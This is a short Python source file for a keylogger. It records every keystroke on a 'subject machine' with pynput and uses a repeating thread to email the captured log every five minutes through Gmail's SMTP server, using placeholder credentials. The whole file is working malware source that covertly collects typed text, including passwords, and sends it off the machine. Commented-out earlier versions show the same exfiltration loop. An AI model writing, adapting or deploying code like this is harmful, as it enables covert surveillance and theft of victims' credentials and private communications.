# This is the main file for the keylogger

# Used to help us capture the keystrokes on the subject machine.
import pynput.keyboard
# Used to send emails every certain amount of time of the log
import smtplib
# NOT NEEDED: Used for scheduling the emails the old way
#import time
# Threading Library
import threading

#---------------------------------------------------------------------------------------------------------------------------------------------------

# FIRST TEST: JUST PRINTING

#def callback_function(key):
#    print(key)

#---------------------------------------------------------------------------------------------------------------------------------------------------

# create a log variable
log = ""

def callback_function(key):
    # Specify the use of the global log
    global log

    # Deals with foreign characters vs regular ones.
    try:  
        # Separates and cleans output. utf-8 resolves crashing due to different languages.
        log = log + key.char.encode("utf-8")
    # Regular characters
    except AttributeError:
        # We change this to use a space instead of writing key.spacebar
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
# Here we want to send it to our computer instead of printing
#    print(log)

# Sends us the email of the log on the given interval
def send_email(email, password, message):
    # Initialize server for gmail
    email_server = smtplib.SMTP("smtp.gmail.com", 587)
    # Start server
    email_server.starttls()
    # Login for me
    email_server.login(email, password)
    # Send the log to yourself
    email_server.sendmail(email, email, message)
    # Quit
    email_server.quit()

# Call the email send.
#send_email("youremail@gmail.com", "yourpassword", log)

# We need to THREAD to send emails and retrieve info at the same time.
def thread_function():
    global log
    send_email("emailaddress@gmail.com", "yourpassword", log)
    # Clear the log after sending it
    log = ""
    # Timer(interval, function)
    timer_object = threading.Timer(5 * 60, thread_function)
    timer_object.start()
    
# Create a listener object
# Upon pressing keys we will trigger the callback function to forward keys pressed.
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)
with keylogger_listener:
    thread_function()
    keylogger_listener.join()

# OLD WAY OF SENDING THE EMAIL.
## Time the log to be sent every so often.
#while True:
#    send_email("emailaddress@gmail.com", "yourpassword", log)
#    # Clear the log after sending it.
#    log = ""
#    # Change the 5 to whatever amount of minutes you want to wait.
#    time.sleep(60 * 5)

